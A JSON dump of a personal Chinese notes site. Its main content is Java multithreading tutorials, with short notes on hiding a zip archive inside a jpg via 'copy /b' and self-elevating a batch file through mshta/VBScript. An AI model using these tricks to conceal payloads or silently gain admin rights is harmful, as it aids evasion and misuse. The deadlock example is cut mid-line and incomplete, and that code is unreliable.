已上笔记打包存储在：https://www.notion.so/songshua/ebc811a9d4ff4e42a879433aabfaebfd?pvs=4","lastmodified":"2023-05-31T09:03:33.045907808Z","tags":null},"/%E5%9B%BE%E7%89%87%E6%9C%A8%E9%A9%AC":{"title":"图片木马","content":"","lastmodified":"2023-05-31T09:03:33.045907808Z","tags":null},"/%E5%A2%A8%E8%80%85%E5%AD%A6%E9%99%A2":{"title":"墨者学院","content":"官网：[墨者学院_专注于网络安全人才培养 (mozhe.cn)](https://www.mozhe.cn/)\n- [[投票系统程序设计缺陷分析]]","lastmodified":"2023-05-31T09:03:33.045907808Z","tags":null},"/%E5%A4%9A%E7%BA%BF%E7%A8%8B":{"title":"多线程","content":"# 多线程\n# 多线程\n\nCreated: August 4, 2022 8:42 AM\nDate: August 4, 2022\n类别: 多线程\n\n# 书写注意点\n\n## 方法一 [继承](多线程.md)\n\n1. 编写一个类，**继承**`Thread`（java.lang.Thread），**重写`run`方法**\n2. 启动线程：在main中new对象，然后使用线程的`start()`，开辟线程栈空间\n\n## 方法二 [实现](多线程.md)  建议\n\n采用这种方式，面向接口编程，更灵活，只能继承一个类，但是接口没有限制\n\n1. 编写一个类A，**实现**`java.lang.Runnable`接口，实现`run` 方法\n2. 启动线程：new一个`Thread`对象，再new一个A对象，把new的A对象作为参数传进去，使用`Thread`对象的`start()`启动线程\n\n## 方法三 [实现`Callable`接口 带有返回值](多线程.md)\n\n1. 优点：带有返回值\n2. 缺点：使用`get()`方法获取返回值时，会导致当前线程产生阻塞，因为需要等待另一个线程返回值\n\n# 进程与线程\n\n## 解释\n\n进程：相当于一个**应用程序**\n\n线程：**一个进程中的执行单元**\n\n一个**进程可以执行多个线程**\n\n在Java语言中，线程之间可以共享堆内存和方法区，但是**线程栈内存独立，一个线程一个栈**\n\n多线程的作用：**提高程序处理效率**（在Java看有没有采用多线程，最简单的方法就是看有没有开辟新的栈）\n\n## 线程生命周期图\n\n![Untitled](../../../../assets/Untitled%2011.png)\n\n## 生活举例理解\n\n接力比赛，一个人跑到400米，就换另一个跑，因为没有各自跑各自的效率没有得到提升，单线程\n\n做作业，为了能够写快点，让另一个朋友帮忙一起写，都在写，但是互不干扰对方写作业，多线程\n\n### 真正的多线程\n\n一个线程只执行自己的线程，每个线程之间不干扰，t1只执行t1，t2只执行2，就叫多线程\n\n而**单核CPU**不能真正的实现多线程，因为只有一个大脑，但是可以通过**频繁切换线程**来给人一个多线程的错觉（计算机的计算速度很快，人类感受不出来）\n\n## 举例\n\n多线程举例：IDM下载，采用多线程下载\n\n多进程：Chrome浏览器，每次打开一个网站，都会新建一个进程\n\n![在任务管理中列举的就是进程](../assets/dd8e53e199f04588b4037037e1f6d9e1.png)\n\n在任务管理中列举的就是进程\n\n# 基本使用方法\n\n## eg1 采用extends的方式\n\n```java\npublic class Test01 {\n    public static void main(String[] args) {\n//创建线程对象\nA t=new A();\n//t.run()//依旧是在main栈中，还是单线程，因为是调用的run方法在主栈中运行\n//怎么看几个线程，看有没有开辟新栈就是最简单的方法\nSystem.out.println(\"启动多线程\");\n        t.start();//开辟线程分支，开辟一个栈分支线程，只有一瞬间，就会结束这个方法。\n//然后JVM会自动在分支线程中，调用t的run方法，运行另一个分支线程\n\n//以下的依旧是在main栈中运行\nfor (int i=0;i\u003c100;i++){\n            System.out.println(\"主线程main--\u003e\"+i);\n        }\n\n    }\n}\nclass A extends Thread {\n    @Override\n    public void run() {\n        for (int i=0;i\u003c100;i++){\n            System.out.println(\"分支线程t--\u003e\"+i+\"===========\");\n        }\n    }\n}\n```\n\n![可以看到主线程和分支线程分别运行自己的，所以输出顺序不定](../../../../assets/Untitled%202%202.png)\n\n可以看到主线程和分支线程分别运行自己的，所以输出顺序不定\n\n## eg2 采用`implements`的方式 推荐这种方式\n\n```java\n\npublic class Test02 {\n    public static void main(String[] args) {\n//线程对象\nThread t=new Thread(new B());//把实现了Runnable的类创建对象，作为参数传进去，封装成线程对象\n//启动分支线程\nt.start();\n//主分支\nfor (int i = 0; i \u003c 100; i++) {\n            System.out.println(\"主分支\"+i);\n        }\n    }\n}\nclass B implements Runnable{\n    @Override\n    public void run() {\n        for (int i = 0; i \u003c100 ; i++) {\n            System.out.println(\"分支线程===========\"+i);\n        }\n    }\n}\n```\n\n![Untitled](../../../../assets/Untitled%203%202.png)\n\n## eg3 implements结合匿名内部类的方式\n\n```java\npublic class Test03 {\n    public static void main(String[] args) {\n//采用匿名内部类的方式\nThread t=new Thread(new Runnable() {\n            @Override\n            public void run() {\n                for (int i = 0; i \u003c 100; i++) {\n                    System.out.println(\"分支线程======\"+i);\n                }\n            }\n        });\n//启动线程\nt.start();\n//主方法\nfor (int i = 0; i \u003c100 ; i++) {\n            System.out.println(\"主线程\"+i);\n        }\n    }\n}\n\n```\n\n![Untitled](../../../../assets/Untitled%204%202.png)\n\n## eg4 实现Callable接口的方式\n\n需要作为参数将继承了`Callable`接口的对象传入FutureTask的构造方法中\n\n```java\nimport sun.security.util.AuthResources_it;\n\nimport java.text.SimpleDateFormat;\nimport java.util.Set;\nimport java.util.concurrent.Callable;\nimport java.util.concurrent.FutureTask;\n\npublic class Test17 {\n    public static void main(String[] args) throws Exception {\n//创建未来任务\nFu f=new Fu();//Fu对象创建，继承了Callable接口，作为参数传入到未来任构造方法中\nFutureTask task=new FutureTask(f);\n//将未来任务作为一个线程\nThread t=new Thread(task);\n        t.setName(\"t线程----》\");\n//启动线程\nt.start();\n//获取t线程的运行时间\nString s=task.get().toString();\n        System.out.println(t.getName()+s);\n    }\n}\n\n//返回了方法的运行时间\nclass Fu implements Callable{\n//这个call方法，就相当于run方法\n@Override\n    public Object call() throws Exception {\n//获取开始时间戳\nlong begin=System.currentTimeMillis();\n\n        System.out.println( \"start call\");\n        Thread.sleep(1000*5);\n        System.out.println( \"start end\");\n//获取结束时间戳\nlong end=System.currentTimeMillis();\n//计算运行了多少秒\nlong speed=(end-begin)/1000;\n        return speed;//自动装箱\n}\n}\n```\n\n![Untitled](../../../../assets/Untitled%205%201.png)\n\n# 常用方法\n\n1. 获取当前线程:`Thread.currentThread()`\n2. 获取线程名称：`getName()`\n3. 设置线程名字:`setName()`\n4. 休眠线程：`Thread.sleep()`  在哪个进程使用，就哪个线程休眠\n5. 终止线程的睡眠（叫醒线程，不让它睡眠）:`.interrupt()`\n6. 设置守护线程 `setDaemon(True)`\n\n## eg1 静态方法 Thread.sleep()\n\n```java\npublic class Test05 {\n    public static void main(String[] args)  {\n        Thread t=new Thread(new Runnable() {\n            @Override\n            public void run() {\n                try {\n                    Thread.sleep(5000);//分支线程休眠五秒\n} catch (InterruptedException e) {\n                    e.printStackTrace();\n                }\n                System.out.println(\"分支线程运行==========\");\n            }\n        });\n        t.setName(\"分支线程t\");\n//分支线程运行\n\n//主线程运行\nSystem.out.println(\"主线程运行\");\n        System.out.println(\"分支程序运行\");\n        t.start();\n        for (int i = 0; i \u003c10 ; i++) {\n            try {\n                Thread.sleep(1000);//休眠1秒\n} catch (InterruptedException e) {\n                e.printStackTrace();\n            }\n            System.out.println(i);\n        }\n\n    }\n}\n\n```\n\n## eg2 Thread面试题\n\n在main方法中的t.sleep是否会休眠t线程\n\n并不会，因为t.sleep()会转换成`thread.sleep()`\n\n无论怎么变，**休眠的始终是当前线程**\n\n```java\nimport java.util.Set;\n\npublic class Test06 {\n    public static void main(String[] args) {\n        Thread t=new Thread(new AAA());\n        t.start();\n        t.setName(\"t\");\n        try {\n            t.sleep(5000);\n        } catch (InterruptedException e) {\n            e.printStackTrace();\n        }\n        System.out.println(\"end\");\n    }\n}\nclass  AAA extends Thread{\n    @Override\n    public void run() {\n        System.out.println(\"线程分支运行=====\");\n    }\n}\n```\n\n![Untitled](../../../../assets/Untitled%206%201.png)\n\n## eg3 终止线程的睡眠（叫醒线程，不让它睡眠）:`.interrupt()`\n\n```java\npackage com.bjpowernode.java.thread;\n/*\nsleep睡眠太久了，如果希望半道上醒来，你应该怎么办？也就是说怎么叫醒一个正在睡眠的线程？？\n    注意：这个不是终断线程的执行，是终止线程的睡眠。\n */\npublic class ThreadTest08 {\n    public static void main(String[] args) {\n        Thread t = new Thread(new MyRunnable2());\n        t.setName(\"t\");\n        t.start();\n\n//希望5秒之后，t线程醒来（5秒之后主线程手里的活儿干完了。）\ntry {\n            Thread.sleep(1000 * 5);\n        } catch (InterruptedException e) {\n            e.printStackTrace();\n        }\n//终断t线程的睡眠（这种终断睡眠的方式依靠了java的异常处理机制。）\nt.interrupt();//干扰，一盆冷水过去！\n}\n}\n\nclass MyRunnable2 implements Runnable {\n\n//重点：run()当中的异常不能throws，只能try catch\n    //因为run()方法在父类中没有抛出任何异常，子类不能比父类抛出更多的异常。\n@Override\n    public void run() {\n        System.out.println(Thread.currentThread().getName() + \"---\u003e begin\");\n        try {\n//睡眠1年\nThread.sleep(1000 * 60 * 60 * 24 * 365);\n        } catch (InterruptedException e) {\n//打印异常信息\n//e.printStackTrace();\n}\n//1年之后才会执行这里\nSystem.out.println(Thread.currentThread().getName() + \"---\u003e end\");\n\n//调用doOther\n        //doOther();\n}\n\n//其它方法可以throws\n    /*public void doOther() throws Exception{\n\n    }*/\n}\n\n```\n\n![Untitled](../../../../assets/Untitled%207%201.png)\n\n## eg4 终止线程的执行1   stop()不建议 不会保存数据\n\n```java\npublic class Test08 {\n    public static void main(String[] args) {\n        A1 a1=new A1();\n        Thread t=new Thread(a1);\n        System.out.println(\"开始线程\");\n        t.start();//\n        //5s之后终止线程\ntry {\n            Thread.sleep(5000);\n        } catch (InterruptedException e) {\n            e.printStackTrace();\n        }\n//终止线程\nt.stop();//过时的终止，不会保存数据\n\nSystem.out.println(\"end\");\n    }\n\n}\nclass A1 implements Runnable{\n    @Override\n    public void run() {\n        for (int i = 0; i \u003c10 ; i++) {\n            System.out.println(Thread.currentThread().getName()+ i);\n            try {\n                Thread.sleep(1000);//睡1s\n} catch (InterruptedException e) {\n                e.printStackTrace();\n            }\n        }\n    }\n}\n```\n\n![Untitled](../../../../assets/Untitled%208%201.png)\n\n## eg5 良好的终止线程\n\n优点：需要执行阶段是执行完了的，不是像stop那样强制停止，可能造成数据的丢失等等问题\n\n```java\npublic class Test09 {\n    public static void main(String[] args) {\n        A2 a = new A2();\n        Thread t = new Thread(a);\n        t.setName(\"t\");\n        t.start();\n        try {\n            Thread.sleep(5000);\n        } catch (InterruptedException e) {\n            e.printStackTrace();\n\n        }\n// t.stop(); //强制停止线程\na.runStatus=false;//更好地停止方式\nSystem.out.println(a.runStatus);\n\n    }\n}\n\nclass A2 extends Thread {\n    Boolean runStatus=true;\n    @Override\n    public void run() {\n        for (int i = 0; i \u003c10 ; i++) {\n            if (runStatus){\n                System.out.println(Thread.currentThread().getName()+\"===\"+i);\n                try {\n                    Thread.sleep(1000);\n                } catch (InterruptedException e) {\n                    e.printStackTrace();\n                }\n            }\n        }\n    }\n}\n```\n\n![Untitled](../../../../assets/Untitled%209%201.png)\n\n## eg6 守护线程\n\n\u003caside\u003e\n💡 守护线程一般是死循环，设置为守护线程之后，会伴随用户线程的死亡而死亡\n**用户线程结束，守护线程自动终止**\n\n\u003c/aside\u003e\n\n```java\nimport jdk.nashorn.internal.ir.WhileNode;\nimport sun.security.util.AuthResources_it;\n\nimport java.util.Set;\n\npublic class Test15 {\n    public static void main(String[] args) {\n        Thread backup=new Thread(new Backup());\n        backup.setName(\"【备份线程t】\");\n//设置成守护线程\nbackup.setDaemon(true);\n//开启线程\nbackup.start();\n        for (int i = 0; i \u003c10; i++) {\n            System.out.println(\"主程序运行\"+i);\n            try {\n                Thread.sleep(1000);\n            } catch (InterruptedException e) {\n                e.printStackTrace();\n            }\n        }\n    }\n}\nclass Backup extends Thread{\n//模拟备份\n@Override\n    public void run() {\n        int i=0;\n        while (true){\n            System.out.println(Thread.currentThread().getName()+\"正在备份--\u003e\"+(++i));\n            try {\nsleep(1000);\n            } catch (InterruptedException e) {\n                e.printStackTrace();\n            }\n        }\n    }\n}\n```\n\n![Untitled](../../../../assets/Untitled%2010%201.png)\n\n# 常见的线程调度模型\n\n## 分类\n\n1. **抢占式**调度模型\n    - 根据**线程的优先级**来对其分配时间片抢占的概率\n    - 优先级\n        - 默认：5  MIN：1 MAX:10\n    \n    设置优先级\n    \n2. **均分式**调度模型\n    \n    **平均分配**\n    \n\n## 线程调度 有关的方法\n\n1. [设置优先级方法](多线程.md)：`setPriority();` 实例方法\n2. 获取优先级方法：`getPriority();`\n3. [让位方法](多线程.md)：`yield()`,暂停当前执行的线程对象，并执行别的线程 （运行状态—\u003e 就绪状态）不是阻塞\n    1. 类似于抓阄，你抓到了，但是因为yield，你需要把这个纸条放回到盒子里面，大家又一起抓阄。抓到的依旧有可能是你\n4. [合并线程](多线程.md)：`join()`\n\n---\n\n### 设置线程优先级\n\n```java\npublic class Test11 {\n    public static void main(String[] args) {\n        System.out.println(\"max:\"+Thread.MAX_PRIORITY);\n        System.out.println(\"min:\"+Thread.MIN_PRIORITY);\n        System.out.println(\"normal:\"+Thread.NORM_PRIORITY);\n//设置main线程优先级\nThread.currentThread().setPriority(1);\n//创建线程\nThread t=new Thread(new Runnable() {\n            @Override\n            public void run() {\n                for (int i = 0; i \u003c1000; i++) {\n                    System.out.println(Thread.currentThread().getName()+\"---\u003e\"+i);\n                }\n            }\n        });\n\n        t.setPriority(10);\n        t.start();\n        for (int i = 0; i \u003c1000; i++) {\n            System.out.println(Thread.currentThread().getName()+\"==\u003e\"+i);\n        }\n    }\n}\n\n```\n\n![可以看到优先级更高的执行的时间片频率更高](../../../../assets/Untitled%2011%201.png)\n\n可以看到优先级更高的执行的时间片频率更高\n\n### 让位\n\n```java\npublic class Test12 {\n    public static void main(String[] args) {\n        Thread t = new Thread(new MyRunnable6());\n        t.setName(\"t\");\n        t.start();\n\n        for(int i = 1; i \u003c= 10000; i++) {\n            System.out.println(Thread.currentThread().getName() + \"---\u003e\" + i);\n        }\n    }\n}\nclass MyRunnable6 implements Runnable {\n\n    @Override\n    public void run() {\n        for(int i = 1; i \u003c= 10000; i++) {\n//每100个让位一次。\nif(i % 100 == 0){\n                System.out.println(\"yield============\");\n                Thread.yield();//当前线程暂停一下，让给主线程。\n}\n            System.out.println(Thread.currentThread().getName() + \"---\u003e\" + i);\n        }\n    }\n}\n```\n\n![Untitled](../../../../assets/Untitled%2012.png)\n\n让位不一定就是另一个线程运行，只是暂停当前线程的运行，回归到就绪，然后重新抢占时间片，依旧可能是之前让位的线程抢占到时间片。\n\n### 线程合并 join\n\n```java\npublic class Test13 {\n    public static void main(String[] args) {\n        Thread t=new Thread(new Runnable() {\n            @Override\n            public void run() {\n                for (int i = 0; i \u003c10000; i++) {\n                    System.out.println(Thread.currentThread().getName()+\"--\"+i);\n                }\n            }\n        });\n        t.setName(\"t\");\n        t.start();\n        System.out.println(\"main begin\");\n        for (int i = 0; i \u003c10000 ; i++) {\n//main到5000的时候，就进入阻塞状态，让t运行完了之后我才运行\nif (i==5000){\n                try {\n                    t.join();\n                } catch (InterruptedException e) {\n                    e.printStackTrace();\n                }\n            }\n            System.out.println(Thread.currentThread().getName()+\"=======\"+i);\n        }\n        System.out.println(\"Main end\");\n    }\n}\n\n```\n\n![Untitled](../../../../assets/Untitled%2013.png)\n\n# 线程安全（线程同步机制synchronize）\n\n## 书写注意点：\n\n1. `synchronize()`括号中填写的**对象**是这些进程之间**所共享的进程实例对象**，比如[例子](多线程.md)。\n2. **同步代码块的范围越小，效率越高**\n3. 放在实例方法上，表示共享对象是`this` 但是**整个方法体**都参与了同步（比如`StringBuffer`的方法）\n    \n    ![Untitled](../../../../assets/Untitled%2014.png)\n    \n\n什么时候用：静态\n\n## 三种写法\n\n1. 同步代码块\n2. 实例方法同步\n3. 类锁（排它锁，统一类的所有对象只有一把锁）\n    1. synchronize出现在静态方法（有static修饰的方法）上\n\n## 原理\n\n1. 原理：\n    1. 每个对象都有一把锁，这把锁决定了程序执行的权利，当程序线程运行到synchronize的时候，就会查看自己是否有括号中的这把锁。\n    2. 如果有，就可以进入同步代码区 进行时间片的抢占；如果发现锁被别的线程拿到了（线程运行的过程中一直是持有这把锁的），自己就需要在同步代码区外面**等待**他用完释放。\n    3. 当发现释放的锁之后，参与共享的线程就会抢那个锁，然后拿到在同步代码区中抢占时间片的权利，抢到时间片，就可以继续执行了。\n2. 如果括号中的是“abc”，因为abc是一个常量量，在常量池中的对象，所以每个参与abc的同步锁的线程，都会相互等待，非常费时间\n3. **局部变量和常量不存在安全问题，因为局部变量不共享，常量不可修改**\n\n## 相关\n\n出现线程安全的三个条件\n\n1. 多线程并发\n2. 线程共享数据\n3. 有修改数据的行为\n\n如何解决：\n\n**线程排队**的方式解决线程安全问题，这种机制称为“**线程同步机制**”，会牺牲一部分效率\n\n### 相关：编程模型\n\n1. 同步编程模型：线程之间发生了等待关系，比如t1需要看t2发生什么或者满足什么，t1才会继续执行，需要照顾到别的线程的运行条件。线程同步机制，需要排队\n2. 异步编程模型：自己干自己的，不管别人。并发\n\n## 线程安全eg\n\n### eg1 线程安全问题：两个线程对同一个账户进行访问\n\n```java\npublic class Test {\n    public static void main(String[] args) {\n        Account a1=new Account(\"张三\",1500);\n        Thread t1=new Thread(new AccountThread(a1));\n        Thread t2=new Thread(new AccountThread(a1));\n        t1.setName(\"t1\");\n        t2.setName(\"t2\");\n        System.out.println(\"余额:\"+a1.getBalance());\n//启动线程取款\nt1.start();\n\n        t2.start();\n    }\n}\n\nclass AccountThread extends Thread{\n    private Account act;\n\n    public AccountThread(Account act) {\n        this.act = act;\n    }\n\n    @Override\n    public void run() {\n        //模拟网络延迟\n        try {\n            Thread.sleep(1001);\n        } catch (InterruptedException e) {\n            e.printStackTrace();\n        }\n        //取款操作\n        double money=500;//取款金额\n        act.withdraw(money);//取款操作\n        System.out.println(\"线程：\"+Thread.currentThread().getName()+\"\\t\"+act.getName()+\" 取款成功！ 余额：\"+act.getBalance());//余额\n    }\n}\n\npublic class Account {\n    private String name;\n    private double balance;\n    //封装\n\n    public Account() {\n    }\n\n    public String getName() {\n        return name;\n    }\n\n    public void setName(String name) {\n        this.name = name;\n    }\n\n    public double getBalance() {\n        return balance;\n    }\n\n    public void setBalance(double balance) {\n        this.balance = balance;\n    }\n\n    public Account(String name, double balance) {\n        this.name = name;\n        this.balance = balance;\n    }\n    //取钱\n    public void withdraw(double money){\n        double before=this.balance;\n        double after=this.balance-money;\n        this.balance=after;\n    }\n}\n\n```\n\n![Untitled](../../../../assets/Untitled%2015.png)\n\n![Untitled](../../../../assets/Untitled%2016.png)\n\n![Untitled](../../../../assets/Untitled%2017.png)\n\n![Untitled](../../../../assets/Untitled%2018.png)\n\n出现了四种情况，有两种错误的情况。\n\n修改取款方法\n\n```java\npublic void withdraw(double money){\n//括号里面代表的是账户对象，\nsynchronized (this){\n        try {\n            Thread.sleep(200);\n        } catch (InterruptedException e) {\n            e.printStackTrace();\n        }\n\n        double before=this.balance;\n        double after=before-money;\n        this.setBalance(after);\n\n    }\n}\n\n```\n\n正确了\n\n![Untitled](../../../../assets/Untitled%2019.png)\n\n目前不懂得是，如果不添加sleep，还是会出现不同步的情况，余额会变成两个500\n\n# 线程死锁\n\n```java\nimport static java.lang.Thread.sleep;\n\npublic class Test01 {\n    public static void main(String[] args) {\n        Object o1=new Object();\n        Object o2=new Object();\n//创建线程 两个线程公用两个对象\nThread t1=new MyThread1(o1,o2);\n        Thread t2=new MyThread2(o1,o2);\n        t1.setName(\"t1\");\n        t2.setName(\"t2\");\n//启动线程\nt1.start();\n        t2.start();\n    }\n}\nclass MyThread1 extends Thread{\n    private Object o1;\n    private Object o2;\n\n    public MyThread1(Object o1, Object o2) {\n        this.o1 = o1;\n        this.o2 = o2;\n    }\n\n    @Override\n    public void run() {\n        synchronized (o1){\n//睡眠\n/*    try {\n                Thread.sleep(2000);\n            } catch (InterruptedException e) {\n                e.printStackTrace();\n            } */\nSystem.out.println(Thread.currentThread().getName());\n//嵌套\nsynchronized (o2){\n                System.out.println(Thread.currentThread().getName());\n            }\n        }\n\n    }\n}\nclass MyThread2 extends Thread{\n    private Object o1;\n    private Object o所以尽\n```\n\n![Untitled](../../../../assets/Untitled%2020.png)\n\n一直在执行，但是执行不了，因为synchronize的原因，一直在等对方的同步锁释放，但是因为两个都提前占用了对方所需要的同步锁，一直没办法释放，所以造成了死锁。就相当于两个人堵在门口一直僵持\n\n**死锁不报错，无异常，难以纠错。**线程无法继续向下继续执行。执行一百年😒so\n\n所以尽量不要选择同步锁嵌套，如果你处理不好，电脑这辈子就卡在死锁上了 \n\n# 定时器Timer\n\n## 书写注意点\n\n1. 对定时器任务的类需要继承`TimerTask` ，并且重写`run`方法\n2. new的时候可以设置Timer对象的参数，**Timer(true)表示，以守护进程的方式设置定时器**\n3. 可以采用匿名内部类的方式\n\n## eg1\n\n```java\nimport java.text.SimpleDateFormat;\nimport java.util.Date;\nimport java.util.Timer;\nimport java.util.TimerTask;\n\npublic class TimerTest {\n    public static void main(String[] args) throws Exception {\n        Timer timer=new Timer();\n// Timer timer=new Timer(true);//采用守护进程的方式运行\n//设置的时间\nSimpleDateFormat geshi=new SimpleDateFormat(\"yyyy-MM-dd HH:mm:ss\");\n        Date firstTime=geshi.parse(\"2022-08-06 10:18:40\");\n//创建定时器任务\ntimer.schedule(new LogTimer(),firstTime,1000*10);//10秒运行一次\n}\n}\n\n//模拟数据备份的定时器\nclass LogTimer extends TimerTask {\n    @Override\n    public void run() {\n//获取当前时间\nSimpleDateFormat s=new SimpleDateFormat(\"yyyy-MM-dd HH:mm:ss SSS\");\n        String now=s.format(new Date());\n//输出\nSystem.out.println(now+\":完成数据备份\");\n    }\n}\n```\n\n![Untitled](../../../../assets/Untitled%2021.png)\n\n# 生产者和消费者模式wait() notify()\n\n\u003caside\u003e\n💡 wait和notify是Java对象的方法，不是线程对象的方法，不要通过线程对象去调用\n\n\u003c/aside\u003e\n\n## 作用\n\n\u003caside\u003e\n💡 在多个线程共享一个对象\n\n\u003c/aside\u003e\n\n## 方法作用\n\n```java\nObject o=new Object();\no.wait();\no.notify();\n```\n\n`wait：`表示将o对象**正在运行的进程进入等待状态，无期限等待，直到调用`notify`方法唤醒**\n\n**释放掉线程占用o对象的锁**\n\n`notify`：可以让o对象正在等待的线程唤醒\n\n**不会释放线程占用o对象的锁**，只是通知\n\n`notifyAll`：唤醒o对象上正在等待的所有线程\n\n### 解释wait和notify\n\n正在打群架，有一个人是跟我对线的，我是一个Object，需要获取与我之间的对战资格才能跟我打\n\n他：我要揍你（获取了与我之间对线的对象锁，获取了与我的对战资格）\n\n我：等一下，（释放了对象锁，没有了与我的对战资格，wait中）\n\n他：开始等待\n\n我：好了，别打帅脸（notify，我对其进行了唤醒）\n\n他：抢夺对战资格，获取对象锁，揍了我一顿\n\n## eg1 生产者和消费者问题\n\n达到的结果：生产一个消费一个，都是同一个\n\n代码解说员：\n\n1. 因为是一一直生产，就使用while\n2. 两个线程公用一个对象，所以需要用到线程同步机制`synchronize`\n3. 需要对仓库的容量进行判断，生产时，大于0就说明有货，进入等待，释放对象锁，\n4. 此时会竞争对象锁获取运行时间片，当消费者获取到时间片，发现大于0，就开始消费，运行完之后，**不会释放锁，而是运行完了synchronize同步代码块之后才释放**\n\n```java\nimport javax.swing.*;\nimport javax.xml.crypto.Data;\nimport java.text.SimpleDateFormat;\nimport java.util.ArrayList;\nimport java.util.Date;\nimport java.util.List;\n\npublic class Test18 {\n    public static void main(String[] args) {\n        List lists = new ArrayList();// 仓库对象\n        // 创建两个线程，一个生产一个消费\n        // 两个线程公用一个仓库对象\n        Thread t1 = new Thread(new Producer(lists));// 将生产者作为参数传进去\n        Thread t2 = new Thread(new Consumer(lists));\n        t1.setName(\"生产者线程---\");\n        t2.setName(\"消费者线程---\");\n        t1.start();\n        t2.start();\n    }\n}\n\n// 生产者\nclass Producer implements Runnable {\n\n    private List lists;// 仓库\n\n    public Producer(List lists) {\n        this.lists = lists;\n    }\n\n    @Override\n    public void run() {\n        // 一直生产\n        while (true) {\n            synchronized (lists) {\n                // 仓库中是否有货\n                if (lists.size() \u003e 0) {\n                    // 有货就等待，释放掉list的锁\n                    try {\n                        lists.wait();\n                    } catch (InterruptedException e) {\n                        e.printStackTrace();\n                    }\n                }\n                // 能运行到这里，说明仓库没货了，那就开始制造\n                Object o = new Object();\n                //制造的时候，都想当懒狗，就歇一会\n                try {\n                    lists.wait(1000);\n                } catch (InterruptedException e) {\n                    e.printStackTrace();\n                }\n                lists.add(o);\n                //加个时间，不然不好看\n                SimpleDateFormat gs=new SimpleDateFormat(\"HH:mm:ss SSS\");\n                String now=gs.format(new Date());\n\n                System.out.println(now+\"-\"+Thread.currentThread().getName() + \"制造货物：\" + o);\n                lists.notify();\n            }\n\n        }\n    }\n}\n\n// 消费者\nclass Consumer implements Runnable {\n    private List lists;// 仓库\n\n    public Consumer(List lists) {\n        this.lists = lists;\n    }\n\n    @Override\n    public void run() {\n        // 一直消费\n\n        while (true) {\n            synchronized (lists) {\n                // 判断是否仓库是否有货\n                if (lists.size() == 0) {\n                    // 仓库没货，就不能消费了，等待生产者生产，释放掉锁\n                    try {\n                        lists.wait();\n                    } catch (InterruptedException e) {\n                        e.printStackTrace();\n                    }\n                }\n                // 能运行到这里，说明仓库有货\n                Object o = lists.remove(lists.size() - 1);// 获取删除的最后一个货物的对象\n\n                SimpleDateFormat gs=new SimpleDateFormat(\"HH:mm:ss SSS\");\n                String now=gs.format(new Date());\n\n                System.out.println(now+\"-\"+Thread.currentThread().getName() + \"消费货物：\" + o);\n                // 消费了，叫醒生产者生产\n                lists.notify();// 不会释放锁，但是如果循环，进入到wait就会释放了\n            }\n        }\n    }\n}\n```\n\n![Untitled](../../../../assets/Untitled%2022.png)","lastmodified":"2023-05-31T09:03:33.045907808Z","tags":null},"/%E5%A6%82%E4%BD%95%E5%86%99%E5%87%BA%E4%BB%A4%E4%BA%BA%E5%BF%83%E5%8A%A8%E7%9A%84%E4%B8%AA%E4%BA%BA%E9%99%88%E8%BF%B0":{"title":"如何写出令人心动的个人陈述","content":"\n\n# 如何写出令人心动的个人陈述\n![[../assets/Pasted image 20220827170501.png]]\n![[../assets/Pasted image 20220827170534.png]]\n![[../assets/Pasted image 20220827170545.png]]\n![[../assets/Pasted image 20220827170549.png]]\n![[../assets/Pasted image 20220827170553.png]]\n![[../assets/Pasted image 20220827170557.png]]\n![[../assets/Pasted image 20220827170600.png]]\n\n![](https://i0.hdslb.com/bfs/album/a2b6791b8b34984752d36c75a2e51181c4352b97.png)\n内容：  \n个人陈述是干啥的  \n招生官/学校想看啥  \n如何开始写个人陈述 - 列清单  \n如何完成个人陈述初稿 - 清单转完整草稿  \n如何完善个人陈述 - 草稿到定稿  \n如何写出吸引人的开头\u0026结尾  \n正式提交前需要做的  \n个人陈述终极检查清单\n","lastmodified":"2023-05-31T09:03:33.045907808Z","tags":null},"/%E5%AE%89%E5%8D%93%E7%9B%B8%E5%86%8C%E5%9B%BE%E7%89%87%E9%9A%90%E8%97%8F":{"title":"安卓相册","content":"\n屏蔽安卓相册的文件名称：\n```\n.nomedia\n```\n文件夹里面有这个文件的，默认不会被扫描图片","lastmodified":"2023-05-31T09:03:33.045907808Z","tags":null},"/%E5%B0%86%E5%8E%8B%E7%BC%A9%E5%8C%85%E6%94%BE%E8%BF%9B%E5%9B%BE%E7%89%87%E9%87%8C":{"title":"将压缩包放进图片里","content":"\n\u003e 这是之前就弄过的，但是上课的时候突然想到，来重新记录补充一下\n作用：将压缩包用图片jpg的方式隐藏起来\n## 步骤\n1、先找到一个压缩包，目前已知可行的是zip和rar格式的\n2、打开cmd命令窗口：win+R 输入cmd，或者在当前的资源管理器地址栏输入cmd回车\n3、输入命令：copy /b 需要藏的图片名和格式 + 需要藏的压缩文件名及格式 生成藏完文件的图片\n\t```\n\t  copy /b 2.jpg +3.zip  yq.jpg\n\t  ```\n就会将压缩包的内容放到图片中，生成一个新的图片文件。\n\n看上去这个图片是9MB，实际上这是一个压缩包\n![Untitled|400](https://tc3.doingnothing.online/assets/202303042323912.png )\n修改后缀名或者直接拖到解压缩程序中打开\n![Untitled](https://tc3.doingnothing.online/assets/202303042323950.png)\n可以看到这个压缩文件的全部内容\n## 注意\n在linux中文件是根据文件头来辨别是什么类型的，而不是文件后缀名。\n所以必须是跟压缩格式一样的文件头才能够成功。\n比如zip和rar都可以放入到jpeg中，因为其文件头相似\n\n此内容在[[网安]]中的[[图片木马]]也有涉及","lastmodified":"2023-05-31T09:03:33.045907808Z","tags":null},"/%E5%B0%86.git%E6%96%87%E4%BB%B6%E5%A4%B9%E4%B8%8E%E4%BB%93%E5%BA%93%E5%88%86%E5%BC%80":{"title":"将.git文件夹与仓库分开","content":"\n在仓库文件夹目录写的，添加.git文件\n```\n  gitdir: C:/Users/tianzhongs/.logseq/git/Ccomma_Users_tianzhongs_Documents_多记/.git\n```\n然后将.git文件夹放在到指定的那个","lastmodified":"2023-05-31T09:03:33.045907808Z","tags":null},"/%E5%BC%80%E6%9C%BA%E8%87%AA%E5%90%AF%E4%BB%A5%E7%AE%A1%E7%90%86%E5%91%98%E8%BF%90%E8%A1%8Cbat%E6%96%87%E4%BB%B6":{"title":"开机自启以管理员运行bat文件","content":"\n\n## 概要\n原因：因为电脑外接键盘，但是笔记本自带的键盘通过各种方式都无法使其永久关闭，因此需要每次都自己手动关闭，所以希望能够在开机的时候执行某段bat命令，同时因为其命令特殊需要以管理员身份权限进行执行。\n## 以管理员身份运行\n如果要使bat文件使用管理员身份启动，一般有两种方法\n在bat文件开机加入以下代码\n```\n  %1 mshta vbscript:CreateObject(\"Shell.Application\").ShellExecute(\"cmd.exe\",\"/c %~s0 